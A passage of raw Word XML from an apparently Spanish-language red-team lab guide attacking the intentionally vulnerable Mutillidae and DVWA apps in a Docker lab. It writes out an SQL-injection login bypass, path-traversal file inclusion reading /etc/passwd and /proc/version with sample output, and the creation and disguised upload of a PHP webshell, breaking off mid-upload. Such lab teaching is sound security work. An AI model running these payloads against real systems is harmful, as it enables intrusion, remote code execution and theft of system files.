    </w:p>
    <w:p w14:paraId="04305D71" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E7D618F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  curl -s -X POST \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B149CEA" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    'http://172.20.0.20/mutillidae/index.php?page=login.php' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20D4A16A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -d 'username=admin%27+OR+%271%27%3D%271&amp;password=x&amp;login-php-submit-button=Login' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18412246" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    | grep -i 'logged in\|query\|accounts'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15CC84D7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6210E26D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CCB63E3" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>8.3 LFI — Local File Inclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C3D1B5" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3050E937" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  curl -s 'http://172.20.0.20/mutillidae/index.php?page=../../../../etc/passwd' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0FC25E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>| grep -E '^[a-z_][a-z0-9_-]*:x:'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A04C65" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E9F73AB" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66252AB4" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Resultado esperado:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE43573" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>root:x:0:0:root:/root:/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE3527E" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>daemon:x:1:1:daemon:/usr/sbin:/bin/sh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE0A42F" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0774F0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="681E2188" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Otros archivos que se pueden extraer por LFI:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66F95278" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>/hosts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05DDAD4C" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>docker exec redteam-kali bash -c "curl -s 'http://172.20.0.20/mutillidae/index.php?page=../../../../etc/hosts'"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="244DFF13" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F3F33CC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t># /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>proc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>version</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>kernel</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> del servidor)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B30648" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "curl -s 'http://172.20.0.20/mutillidae/index.php?page</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>=../../../..</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>/proc/version'"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D04C495" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AF66C75" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo2"/>
        <w:spacing w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="1F3564"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>8.4 File Upload + RCE — Webshell en DVWA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AABA6BD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Paso 1:</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Verificar que DVWA está en modo "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>low</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>security</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7628593A" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Abrir en el navegador:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F40B99" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>http://172.20.0.20/dvwa/security.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="216D9412" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:spacing w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03D645D1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve">Iniciar sesión con </w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> / </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>, seleccionar "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>low</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>" y guardar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E411D25" w14:textId="77777777" w:rsidR="007C2578" w:rsidRPr="005F4B07" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="80"/>
        <w:rPr>
          <w:lang w:val="es-GT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:b/>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>Paso 2 (desde línea de comandos):</w:t>
      </w:r>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Login, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t>upload</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005F4B07">
        <w:rPr>
          <w:sz w:val="21"/>
          <w:lang w:val="es-GT"/>
        </w:rPr>
        <w:t xml:space="preserve"> y verificación de ejecución remota:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3307F374" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">docker exec </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>redteam</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>-kali bash -c "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531368E7" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  # Crear webshell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AAC55DD" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  echo '&lt;?php echo shell_exec(\$_GET[\"cmd\"]); ?&gt;' &gt; /tmp/shell-test.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3066C100" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7106DBF0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  # Login a DVWA</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F307635" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  curl -s -c /tmp/dvwa.txt \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71339802" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -d 'username=admin&amp;password=password&amp;Login=Login' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635B6CE0" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -L 'http://172.20.0.20/dvwa/login.php' &gt; /dev/null</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="456CB9CC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="007C2578">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77209A94" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  # Upload de la shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D706F1" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">  curl -s -b /tmp/dvwa.txt \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C322A09" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -F 'uploaded=@/tmp/shell-test.php;type=image/jpeg' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8376FC" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    -F 'Upload=Upload' \</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D78619D" w14:textId="77777777" w:rsidR="007C2578" w:rsidRDefault="00000000">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
